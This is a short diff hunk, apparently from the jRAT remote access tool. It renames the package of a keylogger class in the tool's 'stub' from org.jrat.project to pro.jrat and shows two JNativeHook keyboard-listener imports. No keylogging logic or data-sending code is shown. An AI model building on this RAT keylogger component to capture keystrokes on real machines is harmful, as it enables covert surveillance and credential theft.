@@ -1,4 +1,4 @@
-package org.jrat.project.stub.keylogger;
+package pro.jrat.stub.keylogger;
 
 import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
